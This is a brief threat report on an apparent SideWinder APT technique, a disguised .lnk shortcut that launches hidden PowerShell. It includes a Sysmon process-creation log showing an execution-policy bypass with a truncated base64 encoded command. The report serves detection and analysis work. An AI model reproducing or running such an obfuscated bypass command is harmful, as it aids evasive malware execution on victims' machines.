# Threat Execution Report: SideWinder APT (.lnk Payload)

## 1. Attack Overview
**Threat Actor:** SideWinder APT
**Vector:** Weaponized Shortcut (`.lnk`) File
**Objective:** Memory-resident execution bypassing static file analysis.

**Mechanics:** The attacker utilizes a malicious `.lnk` file disguised as a legitimate document. Upon user interaction, the shortcut executes a Living-off-the-Land Binary (LOLBin)—specifically `powershell.exe`—to load the malicious payload directly into memory, utilizing bypass flags to evade basic endpoint detection.

## 2. Raw Logs (Sysmon Event ID 1)
**Telemetry Source:** Windows Sysmon (Process Creation)

```json
{
  "EventID": 1,
  "RuleName": "Suspicious PowerShell Execution",
  "UtcTime": "2026-05-18 09:14:22.000",
  "ProcessGuid": "{1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d}",
  "ProcessId": 4012,
  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "FileVersion": "10.0.19041.1",
  "Description": "Windows PowerShell",
  "CommandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA...",
  "CurrentDirectory": "C:\\Users\\Victim\\Desktop\\",
  "User": "CORP\\Victim",
  "ParentImage": "C:\\Windows\\explorer.exe",
  "ParentCommandLine": "C:\\Windows\\explorer.exe"
}
